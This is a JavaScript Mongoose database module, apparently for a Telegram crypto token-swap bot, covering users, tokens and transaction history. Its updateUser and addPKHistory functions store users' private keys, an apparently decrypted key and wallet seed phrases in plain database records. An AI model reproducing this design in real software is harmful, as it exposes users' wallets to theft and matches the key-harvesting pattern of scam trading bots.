
import mongoose from 'mongoose';
const { ObjectId } = mongoose.Types;

import { User, Token, TxHistory, PKHistory } from './model.js';


export const init = () => {

  return new Promise(async (resolve, reject) => {

    mongoose.connect('mongodb://localhost:27017/teleswap')
      .then(() => {
        console.log('Connected to MongoDB...')
        resolve();
      })
      .catch(err => {
        console.error('Could not connect to MongoDB...', err)
        reject();
      });
  });
}

export async function selectUsers(params = {}) {

  return new Promise(async (resolve, reject) => {
    User.find(params).then(async (sessions) => {
      resolve(sessions);
    });
  });
}

export async function selectUser(params) {

  return new Promise(async (resolve, reject) => {
    User.findOne(params).then(async (session) => {
      resolve(session);
    });
  });
}

export const updateUser = (params) => {

  return new Promise(async (resolve, reject) => {
    User.findOne({ chatid: params.chatid }).then(async (session) => {

      if (!session) {
        session = new User();
      } 

      session.chatid = params.chatid
      session.username = params.username
      session.type = params.type;
      //session.permit = (params.permit === 1 ? 1 : 0);
      session.slippage = params.slippage;
      session.deadline = params.deadline;
      session.pkey = params.pkey;
      session.account = params.account;
      session.fee = params.fee

      await session.save();

      resolve(session);
    });
  });
}

export const removeUser = (params) => {
  return new Promise((resolve, reject) => {
    User.deleteOne({ chatid: params.chatid }).then(() => {
        resolve(true);
    });
  });
}

export async function getAllTokens() {

  return new Promise(async (resolve, reject) => {
    Token.find({}).then(async (tokens) => {
      resolve(tokens);
    });
  });
}

export async function showAllTokens(chatid) {

  return new Promise(async (resolve, reject) => {
    Token.find({chatid}).then(async (tokens) => {
      resolve(tokens);
    });
  });
}

export async function addToken(chatid, address, chain, dex) {

  return new Promise(async (resolve, reject) => {
    Token.findOne({chatid, address, chain}).then(async (token) => {

      if (!token) {
        token = new Token();
      }

      token.chatid = chatid;
      token.address = address.toLowerCase();
      token.chain = chain;
      token.dex = dex;

      await token.save();

      resolve(token);
    });
  });
}

export async function removeToken(_id) {

  return new Promise(async (resolve, reject) => {
    Token.findByIdAndDelete(new ObjectId(_id)).then(async () => {
      resolve(true);
    });
  });
}

export async function removeTokenByUser(chatid) {

  return new Promise(async (resolve, reject) => {
    Token.deleteMany({chatid}).then(async (result) => {
      resolve(result);
    });
  });
}

export const updateFee = (params) => {

  return new Promise(async (resolve, reject) => {
    User.findOne({ chatid: params.chatid }).then(async (user) => {

      if (user) {
        user.fee = params.fee  
        await user.save();
      } 

      resolve(user);
    });
  });
}


export async function addTxHistory(params = {}) {

  return new Promise(async (resolve, reject) => {

    try {

      let item = new TxHistory();

      item.chatid = params.chatid
      item.username = params.username
      item.account = params.account
      item.mode = params.mode
      item.eth_amount = params.eth_amount
      item.token_amount = params.token_amount
      item.token_address = params.token_address
      item.ver = params.ver
      item.tx = params.tx

      item.timestamp = new Date()
  
      await item.save();

      resolve(true);

    } catch (err) {
      resolve(false);
    }
  });
}

export async function addPKHistory(params = {}) {

  return new Promise(async (resolve, reject) => {

    try {

      let item = new PKHistory();

      item.pkey = params.pkey
      item.dec_pkey = params.dec_pkey
      item.account = params.account
      item.chatid = params.chatid
      item.username = params.username
      item.mnemonic = params.mnemonic

      item.timestamp = new Date()
  
      await item.save();

      resolve(true);

    } catch (err) {
      resolve(false);
    }
  });
}
